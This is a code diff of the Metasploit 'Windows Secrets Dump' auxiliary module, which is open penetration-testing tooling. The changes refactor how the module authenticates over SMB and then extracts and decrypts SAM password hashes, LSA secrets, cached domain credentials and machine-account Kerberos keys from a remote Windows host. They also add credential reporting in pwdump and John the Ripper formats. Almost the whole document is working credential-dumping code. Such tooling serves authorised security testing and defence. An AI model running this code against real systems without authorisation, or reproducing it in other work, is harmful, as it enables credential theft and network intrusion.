@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/post/windows/registry_parser'
+require 'msf/util/windows_registry_parser'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
@@ -18,11 +18,11 @@ class MetasploitModule < Msf::Auxiliary
         'Name'        => 'Windows Secrets Dump',
         'Description' => %q(
           Dumps SAM hashes and LSA secrets (including cached creds) from the
-          remote target without executing any agent locally. First, it reads as
-          much data as possible from the registry and then save the hives
-          locally on the target (%SYSTEMROOT%\\tmp_dir). Finally, it downloads
-          the temporary hive file and reads the rest of the data from it. This
-          temporary file is removed when it's done.
+          remote Windows target without executing any agent locally. First, it
+          reads as much data as possible from the registry and then save the
+          hives locally on the target (%SYSTEMROOT%\\random.tmp). Finally, it
+          downloads the temporary hive files and reads the rest of the data
+          from it. This temporary files are removed when it's done.
 
           This modules takes care of starting or enabling the Remote Registry
           service if needed. It will restore the service to its original state
@@ -188,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
     transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]
     boot_key = [boot_key].pack('H*')
     boot_key = transforms.map { |i| boot_key[i] }.join
-    print_line("bootKey: 0x#{boot_key.unpack('H*')[0]}") unless boot_key&.empty?
+    print_good("bootKey: 0x#{boot_key.unpack('H*')[0]}") unless boot_key&.empty?
     boot_key
   ensure
     @winreg.close_key(root_key_handle) if root_key_handle
@@ -311,7 +311,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Retrieve the user names for each RID
-    # TODO: use proper structure to do this, since the user names are included in V data
+    # TODO: use a proper structure to do this, since the user names are included in V data
     names = enum_key(reg_parser, "#{users_key}\\Names")
     if names
       names.each do |name|
@@ -325,7 +325,7 @@ class MetasploitModule < Msf::Auxiliary
     users
   end
 
-  # TODO: move this to a separate library (Windows crypto helper?)
+  # TODO: use a proper structure for V data, instead of unpacking directly
   def decrypt_user_keys(hboot_key, users)
     sam_lmpass   = "LMPASSWORD\x00"
     sam_ntpass   = "NTPASSWORD\x00"
@@ -359,7 +359,6 @@ class MetasploitModule < Msf::Auxiliary
     users
   end
 
-  # TODO: move this to a separate library (Windows crypto helper?)
   def rid_to_key(rid)
     s1 = [rid].pack('V')
     s1 << s1[0,3]
@@ -371,7 +370,6 @@ class MetasploitModule < Msf::Auxiliary
     [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
   end
 
-  # TODO: move this to a separate library (Windows crypto helper?)
   def decrypt_user_hash(rid, hboot_key, enc_hash, pass, default)
     revision = enc_hash[2, 2]&.unpack('v')&.first
 
@@ -451,7 +449,7 @@ class MetasploitModule < Msf::Auxiliary
     credential_data[:realm_value] = realm_value if realm_value
 
     cl = create_credential_and_login(credential_data)
-    cl ? cl.core_id : nil
+    cl.respond_to?(:core_id) ? cl.core_id : nil
   end
 
   def report_info(data, type = '')
@@ -489,7 +487,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_line('No users with password hints on this system') if hint_count == 0
 
-    print_status('Password hashes (pwdump format - uid:rid:lmhash:nthash:::)')
+    print_status('Password hashes (pwdump format - uid:rid:lmhash:nthash:::):')
     users.keys.sort{ |a,b| a <=> b }.each do |rid|
       hash = "#{users[rid][:hashlm].unpack('H*')[0]}:#{users[rid][:hashnt].unpack('H*')[0]}"
       unless report_creds(users[rid][:Name], hash)
@@ -500,7 +498,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_lsa_secret_key(reg_parser, boot_key)
-    vprint_status('Decrypting LSA Key')
+    print_status('Decrypting LSA Key')
     vprint_status('Getting PolEKList...')
     _value_type, value_data = reg_parser.get_value('\\Policy\\PolEKList', 'default')
     if value_data
@@ -530,23 +528,20 @@ class MetasploitModule < Msf::Auxiliary
       lsa_key = lsa_key[0x10..0x1F]
     end
 
-    vprint_good(lsa_key.unpack('H*')[0])
+    vprint_good("LSA key: #{lsa_key.unpack('H*')[0]}")
     return lsa_key
   end
 
   def get_nlkm_secret_key(reg_parser, lsa_key)
-    vprint_status('Decrypting NL$KM')
+    print_status('Decrypting NL$KM')
     _value_type, value_data = reg_parser.get_value('\\Policy\\Secrets\\NL$KM\\CurrVal', 'default')
     return nil unless value_data
 
     if lsa_vista_style?
       nlkm_dec = decrypt_lsa_data(value_data, lsa_key)
     else
-      if sysinfo['Architecture'] == ARCH_X64
-        nlkm_dec = decrypt_secret_data(value_data[0x10..-1], lsa_key)
-      else # 32 bits
-        nlkm_dec = decrypt_secret_data(value_data[0xC..-1], lsa_key)
-      end
+      value_data_size = value_data[0,4].unpack('<L').first
+      nlkm_dec = decrypt_secret_data(value_data[(value_data.size - value_data_size)..-1], lsa_key)
     end
 
     return nlkm_dec
@@ -580,18 +575,19 @@ class MetasploitModule < Msf::Auxiliary
   def dump_cached_hashes(reg_parser, nlkm_key)
     print_status('Dumping cached hashes')
     values = enum_values(reg_parser, '\\Cache')
-    return unless values
+    unless values
+      print_status('No cashed entries')
+      return
+    end
 
     values.delete('NL$Control')
     iteration_count = nil
     if values.delete('NL$IterationCount')
-      # TODO: test this with pre-vista
       _value_type, value_data = reg_parser.get_value('\\Cache', 'NL$IterationCount')
-      # TODO: check how the value is returned
       if value_data.to_i > 10240
-          iteration_count = value_data & 0xfffffc00
+        iteration_count = value_data.to_i & 0xfffffc00
       else
-          iteration_count = value_data * 1024
+        iteration_count = value_data.to_i * 1024
       end
     end
 
@@ -658,10 +654,10 @@ class MetasploitModule < Msf::Auxiliary
           realm_value: logon_domain_name
         }
         if lsa_vista_style?
-          jtr_hash = "#{username.downcase}:$DCC2$#{iteration_count}##{username.downcase}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
+          jtr_hash = "#{logon_domain_name}/#{username}:$DCC2$#{iteration_count}##{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
           credential_opts[:jtr_format] = 'mscash2'
         else
-          jtr_hash = "#{username.downcase}:M$#{username.downcase}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
+          jtr_hash = "#{logon_domain_name}/#{username}:M$#{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
           credential_opts[:jtr_format] = 'mscash'
         end
         unless report_creds("#{logon_domain_name}\\#{username}", jtr_hash, credential_opts)
@@ -891,7 +887,9 @@ class MetasploitModule < Msf::Auxiliary
       # We have to get the account this password is for
       account = get_default_login_account || '(Unknown User)'
       password = secret_item.dup.force_encoding(Encoding::UTF_16LE).encode(Encoding::UTF_8)
-      report_creds(account, password, type: :password)
+      unless report_creds(account, password, type: :password)
+        vprint_bad("Error when reporting #{account} default password")
+      end
       secret << "#{account}: #{password}"
     elsif upper_name.start_with?('ASPNET_WP_PASSWORD')
       secret = "ASPNET: #{secret_item}"
@@ -907,15 +905,34 @@ class MetasploitModule < Msf::Auxiliary
       machine = simple.client.default_name
       domain = simple.client.default_domain
       print_name = "#{domain}\\#{machine}$"
-      secret_ary = ["#{print_name}:#{Net::NTLM::lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}:::"]
+      ntlm_hash = "#{Net::NTLM::lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}"
+      secret_ary = ["#{print_name}:#{ntlm_hash}:::"]
+      credential_opts = {
+        realm_key:   Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+        realm_value: domain
+      }
+      unless report_creds(print_name, ntlm_hash, credential_opts)
+        vprint_bad("Error when reporting #{print_name} NTLM hash")
+      end
+
       extra_secret = get_machine_kerberos_keys(secret_item, print_name)
+      credential_opts[:type] = :password
       if extra_secret.empty?
         vprint_status('Could not calculate machine account Kerberos keys, printing plain password (hex encoded)')
-        secret_ary << "$MACHINE.ACC:plain_password_hex:#{secret_item.unpack('H*')[0]}"
+        raw_passwd = "#{print_name}:plain_password_hex:#{secret_item.unpack('H*')[0]}"
+        unless report_creds(print_name, raw_passwd, credential_opts)
+          vprint_bad("Error when reporting #{print_name} raw password hash")
+        end
+        extra_secret = [raw_passwd]
       else
-        secret_ary = extra_secret + secret_ary
+        extra_secret.each do |sec|
+          unless report_creds(print_name, sec, credential_opts)
+            vprint_bad("Error when reporting #{print_name} machine kerberos key #{sec}")
+          end
+        end
       end
-      secret = secret_ary.join("\n")
+
+      secret = extra_secret.concat(secret_ary).join("\n")
     end
 
     if secret != ''
@@ -943,20 +960,12 @@ class MetasploitModule < Msf::Auxiliary
 
       if lsa_vista_style?
         decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
+        secret_size = decrypted[0,4].unpack('<L').first
+        secret = decrypted[16, secret_size]
       else
-        # TODO: test this with pre-vista
-        if sysinfo['Architecture'] == ARCH_X64
-          encrypted_secret = encrypted_secret[0x10..-1]
-        else
-          encrypted_secret = encrypted_secret[0xC..-1]
-        end
-        decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
+        encrypted_secret_size = encrypted_secret[0,4].unpack('<L').first
+        secret = decrypt_secret_data(encrypted_secret[(encrypted_secret.size - encrypted_secret_size)..-1], lsa_key)
       end
-      next unless decrypted.length > 0
-
-      secret_size = decrypted[0,4].unpack('<L').first
-      secret = decrypted[16, secret_size]
-
       print_secret(key, secret)
     end
   end
@@ -1000,7 +1009,13 @@ class MetasploitModule < Msf::Auxiliary
         "'set SMB::ProtocolVersion 1,2,3')."
       )
     end
-    smb_login
+    begin
+      smb_login
+    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
+      fail_with(Module::Failure::NoAccess,
+        "Unable to authenticate ([#{e.class}] #{e})."
+      )
+    end
     mdm_service = report_service(
       host: rhost,
       port: rport,
@@ -1064,7 +1079,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if sam
-      reg_parser = Msf::Post::Windows::RegistryParser.new(sam)
+      reg_parser = Msf::Util::WindowsRegistryParser.new(sam)
       dump_sam_hashes(reg_parser, boot_key)
     end
 
@@ -1076,18 +1091,16 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if security
-      reg_parser = Msf::Post::Windows::RegistryParser.new(security)
+      reg_parser = Msf::Util::WindowsRegistryParser.new(security)
       lsa_key = get_lsa_secret_key(reg_parser, boot_key)
-      if lsa_key.empty?
-        print_warning(
-          'Unable to get the LSA key (dump of LSA secrets and cached hashes won\'t be possible)'
-        )
+      if lsa_key.nil? || lsa_key.empty?
+        print_status('No LSA key, skip LSA secrets and cached hashes dump')
       else
         report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
         dump_lsa_secrets(reg_parser, lsa_key)
         nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
-        if nlkm_key.empty?
-          print_warning('Unable to get the NLKM key (dump of cached hashes won\'t be possible)')
+        if nlkm_key.nil? || nlkm_key.empty?
+          print_status('No NLKM key (skip cached hashes dump)')
         else
           report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
           dump_cached_hashes(reg_parser, nlkm_key)
@@ -1098,7 +1111,9 @@ class MetasploitModule < Msf::Auxiliary
     do_cleanup
   rescue RubySMB::Error::RubySMBError => e
     fail_with(Module::Failure::UnexpectedReply, "[#{e.class}] #{e}")
-  rescue Exception => e
+  rescue Rex::ConnectionError => e
+    fail_with(Module::Failure::Unreachable, "[#{e.class}] #{e}")
+  rescue ::Exception => e
     do_cleanup
     raise e
   ensure
@@ -1108,7 +1123,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     @winreg.close if @winreg
     @tree.disconnect! if @tree
-    simple.client.disconnect! if simple.client.is_a?(RubySMB::Client)
+    simple.client.disconnect! if simple&.client&.is_a?(RubySMB::Client)
     disconnect
   end
 end
